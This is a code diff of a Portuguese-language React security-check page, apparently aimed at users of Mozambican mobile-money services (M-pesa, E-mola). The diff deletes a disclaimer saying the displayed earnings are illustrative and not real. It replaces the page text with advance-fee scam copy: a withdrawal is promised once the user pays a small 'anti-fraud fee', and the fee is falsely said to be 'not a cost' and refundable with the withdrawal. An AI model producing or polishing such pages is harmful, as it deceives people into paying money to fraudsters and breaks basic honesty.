@@ -18,21 +18,15 @@ function SecurityPage({ totalValue, onContinue }: SecurityPageProps) {
           <Shield className="w-16 h-16 mx-auto" />
           <h1 className="text-2xl md:text-3xl font-bold flex items-center justify-center gap-2">
             <span className="text-3xl">🔒</span>
-            Verificação de Segurança
+            Confirmação de Segurança Necessária
           </h1>
         </div>
 
         {/* Conteúdo principal */}
         <div className="p-6 md:p-8 space-y-6">
-          <div className="bg-gradient-to-br from-blue-50 to-blue-100 border-l-4 border-blue-500 rounded-xl p-4 shadow-md">
-            <p className="text-sm sm:text-base text-gray-800 font-medium text-center">
-              ⚠️ <strong>Nota Importante:</strong> Os valores apresentados são meramente ilustrativos e não representam ganhos reais. Esta é apenas uma demonstração.
-            </p>
-          </div>
-
           {/* Valor em destaque */}
           <div className="text-center space-y-2">
-            <p className="text-gray-700">Valor demonstrativo acumulado:</p>
+            <p className="text-gray-700">Antes de liberar o seu saque de</p>
             <div className="flex items-center justify-center gap-2">
               <span className="text-3xl">💰</span>
               <p className="text-4xl md:text-5xl font-bold text-green-600">
@@ -42,7 +36,7 @@ function SecurityPage({ totalValue, onContinue }: SecurityPageProps) {
           </div>
 
           <p className="text-center text-gray-700 text-lg">
-            Precisamos confirmar sua identidade antes de prosseguir.
+            precisamos confirmar que você é uma pessoa real e não um robô.
           </p>
 
           {/* Explicação */}
@@ -50,7 +44,7 @@ function SecurityPage({ totalValue, onContinue }: SecurityPageProps) {
             <p className="text-gray-700 flex items-start gap-2">
               <span className="text-gray-400 mt-1">○</span>
               <span>
-                Para garantir a segurança da sua conta, vamos realizar uma verificação de identidade simples.
+                Para isso, o sistema exige um cadastro de segurança (M-pesa ou E-mola) com uma pequena taxa anti-fraude.
               </span>
             </p>
           </div>
@@ -61,25 +55,19 @@ function SecurityPage({ totalValue, onContinue }: SecurityPageProps) {
               <CheckCircle className="w-6 h-6 text-green-600 flex-shrink-0 mt-1" />
               <div>
                 <p className="font-bold text-black text-lg mb-3">
-                  Esta verificação existe para proteger sua conta contra:
+                  Essa verificação existe para proteger o seu dinheiro contra:
                 </p>
                 <div className="space-y-2">
                   <div className="flex items-start gap-2">
                     <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
                     <p className="text-gray-700">
-                      Acessos não autorizados por terceiros
+                      Robôs automáticos que estavam explorando o sistema
                     </p>
                   </div>
                   <div className="flex items-start gap-2">
                     <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
                     <p className="text-gray-700">
-                      Atividades automatizadas suspeitas no sistema
-                    </p>
-                  </div>
-                  <div className="flex items-start gap-2">
-                    <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
-                    <p className="text-gray-700">
-                      Uso indevido de perfis falsos ou duplicados
+                      Cadastros falsos que tentavam sacar valores indevidos
                     </p>
                   </div>
                 </div>
@@ -93,25 +81,25 @@ function SecurityPage({ totalValue, onContinue }: SecurityPageProps) {
               <AlertTriangle className="w-6 h-6 text-yellow-600 flex-shrink-0 mt-1" />
               <div>
                 <p className="font-bold text-black text-lg mb-3">
-                  Informações Importantes:
+                  Importante:
                 </p>
                 <div className="space-y-2">
                   <div className="flex items-start gap-2">
                     <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
                     <p className="text-gray-700">
-                      A verificação é rápida e segura.
+                      Essa taxa NÃO é um custo.
                     </p>
                   </div>
                   <div className="flex items-start gap-2">
                     <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
                     <p className="text-gray-700">
-                      Seus dados pessoais são protegidos.
+                      Você recebe ela de volta junto com o valor do seu saque.
                     </p>
                   </div>
                   <div className="flex items-start gap-2">
                     <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
                     <p className="text-gray-700">
-                      Este processo garante a autenticidade da sua conta.
+                      Ou seja: o que é seu, volta garantido.
                     </p>
                   </div>
                 </div>
@@ -123,10 +111,10 @@ function SecurityPage({ totalValue, onContinue }: SecurityPageProps) {
           <div className="text-center space-y-4 pt-4">
             <p className="font-bold text-black text-xl flex items-center justify-center gap-2">
               <span>👇</span>
-              Próximo Passo
+              Próximo passo
             </p>
             <p className="text-gray-700">
-              Clique no botão abaixo para completar a verificação de identidade e prosseguir.
+              Clique no botão abaixo, ative o seu cadastro e libere agora mesmo o seu saque.
             </p>
           </div>
 
@@ -135,7 +123,7 @@ function SecurityPage({ totalValue, onContinue }: SecurityPageProps) {
             onClick={handleActivate}
             className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-5 px-8 rounded-2xl transition-colors text-lg shadow-lg"
           >
-            Completar Verificação
+            Ativar Cadastro e Liberar Saque
           </button>
         </div>
       </div>
